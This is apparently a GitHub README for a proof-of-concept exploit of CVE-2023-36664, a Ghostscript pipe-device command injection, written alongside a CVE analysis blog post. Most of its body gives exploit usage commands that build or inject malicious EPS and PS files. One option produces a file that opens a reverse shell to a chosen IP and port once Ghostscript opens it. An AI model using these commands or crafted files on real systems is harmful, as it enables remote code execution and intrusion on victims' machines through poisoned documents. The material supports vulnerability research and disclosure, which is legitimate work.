# Ghostscript command injection vulnerability PoC (CVE-2023-36664)

Vulnerability disclosed in Ghostscript prior to version 10.01.2 leads to code execution (CVSS score 9.8).

<a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36664" target="_blank">Official</a> vulnerability description:
> Artifex Ghostscript through 10.01.2 mishandles permission validation for pipe devices (with the %pipe% prefix or the | pipe character prefix).

<a href="https://www.debian.org/security/2023/dsa-5446" target="_blank">Debian</a> released a security advisory mentioning possible execution of arbitrary commands:
> "It was discovered that Ghostscript, the GPL PostScript/PDF interpreter, does not properly handle permission validation for pipe devices, which could result in the execution of arbitrary commands if malformed document files are processed."

The repo is created for a CVE analysis blog post available on <a href="https://www.vicarius.io/vsociety" target="_blank">vsociety blog</a>.

## Exploitation
Download Ghostscript 10.01.1 here: https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/tag/gs10011
Direct link to Windows x64 executable: https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs10011/gs10011w64.exe

The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices. 

Usage: `python3 CVE_2023_36664_exploit.py <input_file> <command>`

Example:
```bash
python3 CVE_2023_36664_exploit.py file.eps "calc"
```
This generates a new file called `file_injected.eps`.

Open this with Ghostscript to trigger the calculator (since version 9.50 you also have to use `-dNOSAFER` option):
```bash
gs10011w64.exe -dNOSAFER .\file_injected.eps
```
<img width="905" alt="proof" src="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/assets/42498816/7d3dcc9b-bc58-4411-b4d8-725bafd02499">

Other examples:
Generate a new EPS file called run_calculator.eps with payload "calc" (pops up a new calculator on Windows)
```bash
python3 CVE_2023_36664_exploit.py --generate --payload calc --filename run_calculator --extension eps
```
Generate a new EPS file called rev_shell.eps with a custom IP (start a reverse shell when triggered on Unix)
```bash
python3 CVE_2023_36664_exploit.py --generate --revshell -ip 10.10.10.10 -port 4242 --filename trigger_revshell --extension eps
```
Generate a new PS file malicius.ps with payload "calc" (pops up a new calculator on Windows)
```bash
python3 CVE_2023_36664_exploit.py -g -p "calc" -x ps
```
Inject malicious custom payload ("calc") to an existing file called file.eps (pops up a new calculator on Windows)
```bash
python3 CVE_2023_36664_exploit.py --inject --payload "calc" --filename file.eps
```

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
